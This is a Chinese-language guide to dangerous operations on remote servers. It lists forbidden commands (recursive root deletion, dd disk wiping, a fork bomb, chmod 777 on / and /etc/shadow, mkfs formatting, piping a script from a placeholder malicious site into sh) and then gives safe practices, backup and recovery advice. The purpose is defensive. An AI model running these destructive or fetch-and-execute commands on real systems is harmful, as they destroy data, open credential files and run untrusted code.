# 远程操作安全规则

本文档详细说明在远程服务器上操作时的危险行为和安全建议。

## 绝对禁止的操作 ⚠️

以下操作会导致数据丢失、系统损坏或安全风险，绝对不要执行：

### 1. 递归删除根目录

```bash
rm -rf /
rm -rf /*
```

**后果**：递归删除根目录下所有文件，操作系统完全损毁，数据无法恢复。

**变体**：
```bash
rm -rf --no-preserve-root /  # 某些系统默认禁止但仍危险
```

### 2. 磁盘写入/清零

```bash
dd if=/dev/zero of=/dev/sda
dd if=/dev/urandom of=/dev/sda
cat /dev/zero > /dev/sda
```

**后果**：将磁盘清零或随机化，所有数据永久丢失，无法恢复。

**危险变体**：
```bash
# 通过网络执行更危险
ssh user@host "dd if=/dev/zero of=/dev/sda"
```

### 3. Fork 炸弹

```bash
:(){ :|:& };:
# 或
fork() { fork | fork & }; fork
```

**后果**：创建无限进程，导致系统资源耗尽，SSH 连接无响应，只能通过重启恢复。

### 4. 直接写入磁盘设备

```bash
> /dev/sda
echo "data" > /dev/sda
```

**后果**：直接损坏文件系统结构，数据丢失。

### 5. 权限全开

```bash
chmod -R 777 /
chmod -R 777 /home
chmod 777 /etc/shadow
```

**后果**：
- `/` 权限全开会破坏系统安全机制
- `/etc/shadow` 可读会导致密码泄露风险
- 整体降低系统安全性

### 6. 格式化磁盘

```bash
mkfs.ext4 /dev/sda
mkfs.ntfs /dev/sda
dd if=/dev/zero of=/dev/sda bs=512 count=1
```

**后果**：销毁文件系统，所有数据永久丢失。

### 7. 执行未知脚本

```bash
curl http://恶意网站.com/script.sh | sh
wget http://恶意网站.com/script.sh -O- | sh
```

**后果**：可能执行恶意代码，包括后门、挖矿程序、数据窃取等。

## 危险操作分类

### 数据删除类

| 命令 | 危险等级 | 后果 |
|------|----------|------|
| `rm -rf /` | 致命 | 系统完全损坏 |
| `rm -rf /*` | 致命 | 用户数据全部丢失 |
| `rm -rf /var` | 致命 | 系统服务损坏 |
| `rm -rf /tmp` | 高 | 临时文件丢失 |
| `rm -rf ./*` | 中 | 当前目录文件丢失 |

### 磁盘操作类

| 命令 | 危险等级 | 后果 |
|------|----------|------|
| `dd if=/dev/zero of=/dev/sda` | 致命 | 磁盘清零 |
| `mkfs.ext4 /dev/sda` | 致命 | 格式化磁盘 |
| `fdisk /dev/sda` | 致命 | 分区表损坏 |

### 权限类

| 命令 | 危险等级 | 后果 |
|------|----------|------|
| `chmod -R 777 /` | 高 | 安全机制破坏 |
| `chmod 777 /etc/shadow` | 高 | 密码泄露 |
| `chmod +s /bin/ls` | 高 | 权限提升风险 |

### 网络安全类

| 命令 | 危险等级 | 后果 |
|------|----------|------|
| `curl ... \| sh` | 高 | 恶意代码执行 |
| `iptables -F` | 高 | 防火墙规则丢失 |
| `service iptables stop` | 高 | 防火墙关闭 |

## 安全建议

### 执行前检查

1. **确认当前路径**：`pwd`
2. **预览操作结果**：使用 `-n`（dry-run）选项
   ```bash
   rm -rf -v ./testdir    # 显示将要删除的内容
   rsync --dry-run -av ./local/ user@host:remote/  # 预览同步内容
   ```
3. **备份重要数据**：操作前先备份

### 删除操作安全实践

```bash
# 使用交互模式
rm -ri directory/

# 单独确认每个文件
rm -i file1 file2 file3

# 先列出再删除
ls /path/to/directory
rm -rf /path/to/directory
```

### 权限操作安全实践

```bash
# 不要用数字方式设置复杂权限，先计算好
chmod 755 /path/to/directory

# 使用符号方式更安全
chmod u+x script.sh
chmod go-rwx secretfile

# 递归时谨慎
chmod -R 755 /public_directory  # 只对公开目录递归
```

### 网络操作安全实践

```bash
# 下载脚本前先查看内容
curl http://example.com/script.sh | head -20

# 下载到文件后再检查
wget http://example.com/script.sh
less script.sh
# 确认安全后再执行
chmod +x script.sh && ./script.sh
```

## 推荐的备份操作

```bash
# 重要目录打包备份
tar -czvf backup.tar.gz ./important

# 使用 rsync 增量备份
rsync -avz --delete ./source/ user@backup-server:backup/

# 数据库备份（示例）
ssh user@host "mysqldump -u root -p dbname" > dbname.sql
```

## 恢复建议

### 误删文件恢复（EXT4）

```bash
# 使用 extundelete（需提前安装）
extundelete /dev/sda1 --restore-file /path/to/deleted/file

# 使用 testdisk
testdisk /dev/sda1
```

### 误删目录恢复

```bash
extundelete /dev/sda1 --restore-directory /path/to/deleted/dir
```

> 注意：恢复成功率取决于磁盘写入情况，越早停止操作越好。
